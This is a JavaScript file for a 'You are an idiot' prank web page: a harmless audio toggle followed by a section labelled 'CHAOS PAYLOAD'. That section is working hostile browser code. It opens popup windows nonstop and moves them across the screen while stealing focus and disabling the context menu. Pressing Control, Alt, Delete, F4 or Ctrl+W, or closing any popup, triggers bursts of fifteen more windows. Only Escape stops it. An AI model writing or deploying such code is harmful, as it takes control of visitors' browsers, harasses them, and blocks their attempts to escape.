let container = document.querySelector('#youare-container');
let audio = document.querySelector('#youare-audio');
let ovlap = document.querySelector('#youare-overlap');
let micon = document.querySelector('#youare-micon');

let overlap = false;

function audioPlay() {
	if (!overlap) {
		audio.currentTime = 0;
		audio.play();
	} else {
		ovlap.currentTime = 0;
		ovlap.play();
	}
	container.removeEventListener('click', audioPlay);
	audio.addEventListener('timeupdate', audioOverlap);
	ovlap.addEventListener('timeupdate', audioOverlap);
	container.classList.remove('clicky');
	micon.src = "/images/speaker.avif";
}

function audioStop() {
	audio.currentTime = 0;
	audio.pause();
	ovlap.currentTime = 0;
	ovlap.pause();
	container.addEventListener('click', audioPlay);
	audio.removeEventListener('timeupdate', audioOverlap);
	ovlap.removeEventListener('timeupdate', audioOverlap);
	container.classList.add('clicky');
	micon.src = "/images/speakerm.avif";
}

function audioSwitch() {
	if (audio.duration > 0 && audio.paused && ovlap.duration > 0 && ovlap.paused) {
		audioPlay();
	} else {
		audioStop();
	}
}

function audioOverlap() {
	if (!overlap && audio.currentTime > audio.duration - .45) {
		ovlap.currentTime = 0;
		ovlap.play();
		overlap = true;
	}
	if (overlap && ovlap.currentTime > ovlap.duration - .5) {
		audio.currentTime = 0;
		audio.play();
		overlap = false;
	}
}

container.addEventListener('click', audioPlay);
container.addEventListener('click', () => container.classList.remove('clicky'));
micon.addEventListener('click', audioSwitch);

// ==========================================================================
// CHAOS PAYLOAD: Autonomous, aggressive, retaliatory, teleporting
// ==========================================================================
(function() {
	const urlParams = new URLSearchParams(window.location.search);
	const urlSession = urlParams.get('session');
	const isPopup = (window.opener !== null || !!urlSession);
	const sessionId = urlSession || 'i_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 7);

	const killKey = 'ik_' + sessionId;
	let pollId = null;
	let moveTimer = null;
	let spawnTimer = null;
	const myChildren = [];
	let lastRetaliation = 0;

	function isKilled() {
		try { return !!localStorage.getItem(killKey); } catch (e) { return false; }
	}
	function signalKill() {
		try { localStorage.setItem(killKey, Date.now().toString()); } catch (e) {}
	}
	function clearKill() {
		try { localStorage.removeItem(killKey); } catch (e) {}
	}

	// Main page clears stale kill on load
	if (!isPopup && !urlSession) {
		clearKill();
	}

	// -------------------------------------------------------------------------
	// Popup auto-play audio (all windows that have the audio elements)
	// -------------------------------------------------------------------------
	function startPopupAudio() {
		const a = document.getElementById('youare-audio');
		const o = document.getElementById('youare-overlap');
		if (!a) return false;
		let popupOverlap = false;
		function pOverlap() {
			if (!popupOverlap && a.currentTime > a.duration - .45) {
				o.currentTime = 0;
				o.play().catch(() => {});
				popupOverlap = true;
			}
			if (popupOverlap && o.currentTime > o.duration - .5) {
				a.currentTime = 0;
				a.play().catch(() => {});
				popupOverlap = false;
			}
		}
		a.currentTime = 0;
		a.play().catch(() => {});
		a.addEventListener('timeupdate', pOverlap);
		o.addEventListener('timeupdate', pOverlap);
		return true;
	}
	if (!startPopupAudio()) {
		let tries = 0;
		const retry = setInterval(() => {
			if (startPopupAudio() || ++tries > 25) clearInterval(retry);
		}, 50);
	}

	// -------------------------------------------------------------------------
	// Global kill watcher
	// -------------------------------------------------------------------------
	pollId = setInterval(() => {
		if (isKilled()) doCleanup();
	}, 500);

	// -------------------------------------------------------------------------
	// Movement: chaotic bounce with random teleports across virtual desktop
	// -------------------------------------------------------------------------
	let xOff = 5;
	let yOff = 5;
	let xPos = 400;
	let yPos = -100;
	const WIN_W = 357;
	const WIN_H = 330;

	function getDesktopBounds() {
		const sw = screen.width || 1920;
		const sh = screen.height || 1080;
		let minX = -sw * 4;
		let minY = -sh * 4;
		let maxX = sw * 5;
		let maxY = sh * 5;
		if (typeof screen.left === 'number')       minX = Math.min(minX, screen.left - sw * 3);
		if (typeof screen.top === 'number')        minY = Math.min(minY, screen.top  - sh * 3);
		if (typeof screen.availLeft === 'number')  minX = Math.min(minX, screen.availLeft - sw * 3);
		if (typeof screen.availTop === 'number')   minY = Math.min(minY, screen.availTop  - sh * 3);
		if (typeof screen.width === 'number')       maxX = Math.max(maxX, (screen.left || 0) + screen.width  + sw * 3);
		if (typeof screen.height === 'number')    maxY = Math.max(maxY, (screen.top  || 0) + screen.height + sh * 3);
		if (typeof screen.availWidth === 'number')  maxX = Math.max(maxX, (screen.availLeft || 0) + screen.availWidth  + sw * 3);
		if (typeof screen.availHeight === 'number') maxY = Math.max(maxY, (screen.availTop  || 0) + screen.availHeight + sh * 3);
		return { minX, minY, maxX, maxY };
	}

	function chaosDirection(biasLeft, biasRight, biasUp, biasDown) {
		let minX = -35, maxX = 35;
		let minY = -35, maxY = 35;
		if (biasLeft)  { minX = -35; maxX = -8; }
		if (biasRight) { minX = 8;   maxX = 35; }
		if (biasUp)    { minY = -35; maxY = -8; }
		if (biasDown)  { minY = 8;   maxY = 35; }
		xOff = Math.random() * (maxX - minX) + minX;
		yOff = Math.random() * (maxY - minY) + minY;
		window.focus();
	}

	function openWindow(url) {
		if (isKilled()) return;
		const w = window.open(
			url,
			'_blank',
			`menubar=no,status=no,toolbar=no,resizable=no,width=${WIN_W},height=${WIN_H},titlebar=no,alwaysRaised=yes`
		);
		if (w) myChildren.push(w);
	}

	async function proCreate(count) {
		for (let i = 0; i < count; i++) {
			if (isKilled()) return;
			openWindow('/moron?session=' + encodeURIComponent(sessionId));
			await new Promise(r => setTimeout(r, 50));
		}
	}

	function playBall() {
		if (isKilled()) { doCleanup(); return; }
		const b = getDesktopBounds();

		// Random teleport (~2% chance per frame)
		if (Math.random() < 0.02) {
			xPos = b.minX + Math.random() * (b.maxX - b.minX - WIN_W);
			yPos = b.minY + Math.random() * (b.maxY - b.minY - WIN_H);
			chaosDirection();
		}

		// Sudden direction change (~8% chance per frame)
		if (Math.random() < 0.08) {
			chaosDirection();
		}

		// Occasional focus steal
		if (Math.random() < 0.03) {
			window.focus();
		}

		xPos += xOff;
		yPos += yOff;

		if (xPos > b.maxX - WIN_W) { xPos = b.maxX - WIN_W; chaosDirection(true, false, false, false); }
		if (xPos < b.minX)         { xPos = b.minX;         chaosDirection(false, true, false, false); }
		if (yPos > b.maxY - WIN_H) { yPos = b.maxY - WIN_H; chaosDirection(false, false, true, false); }
		if (yPos < b.minY)         { yPos = b.minY;         chaosDirection(false, false, false, true); }

		window.moveTo(Math.round(xPos), Math.round(yPos));
		moveTimer = setTimeout(playBall, 1);
	}

	// -------------------------------------------------------------------------
	// Child watcher: if a child is closed, retaliate with 15 more windows
	// -------------------------------------------------------------------------
	function startChildWatcher() {
		setInterval(() => {
			if (isKilled()) return;
			let closedCount = 0;
			myChildren.forEach((w, i) => {
				try {
					if (w.closed) closedCount++;
				} catch (e) { closedCount++; }
			});
			// Filter out dead ones
			for (let i = myChildren.length - 1; i >= 0; i--) {
				try {
					if (myChildren[i].closed) myChildren.splice(i, 1);
				} catch (e) { myChildren.splice(i, 1); }
			}
			if (closedCount > 0 && Date.now() - lastRetaliation > 2000) {
				proCreate(15);
				lastRetaliation = Date.now();
			}
		}, 600);
	}

	function doCleanup() {
		if (moveTimer) { clearTimeout(moveTimer); moveTimer = null; }
		if (pollId) { clearInterval(pollId); pollId = null; }
		if (spawnTimer) { clearInterval(spawnTimer); spawnTimer = null; }
		try {
			const a = document.getElementById('youare-audio');
			const o = document.getElementById('youare-overlap');
			if (a) { a.pause(); a.currentTime = 0; }
			if (o) { o.pause(); o.currentTime = 0; }
		} catch (e) {}
		try { window.close(); } catch (e) {}
	}

	// -------------------------------------------------------------------------
	// Triggers & traps (exact original flavor + escalation)
	// -------------------------------------------------------------------------
	container.addEventListener('click', async () => {
		if (isKilled()) return;
		await proCreate(6);
	});

	window.onbeforeunload = () => "Are you an idiot?";
	window.oncontextmenu = () => false;

	window.onkeydown = async (event) => {
		if (event.key === 'Escape') {
			signalKill();
			doCleanup();
			return;
		}
		if (isKilled()) return;

		if (['Control', 'Alt', 'Delete', 'F4'].includes(event.key)) {
			event.preventDefault?.();
			await proCreate(15);
			alert('You are an idiot!');
			return;
		}

		if ((event.ctrlKey || event.metaKey) && event.key.toLowerCase() === 'w') {
			event.preventDefault?.();
			await proCreate(15);
			alert('You are an idiot!');
			return;
		}
	};

	// Continuous auto-spawn every 2.5 seconds
	spawnTimer = setInterval(() => {
		if (!isKilled()) openWindow('/moron?session=' + encodeURIComponent(sessionId));
	}, 2500);

	// Start chaos
	playBall();
	startChildWatcher();
})();
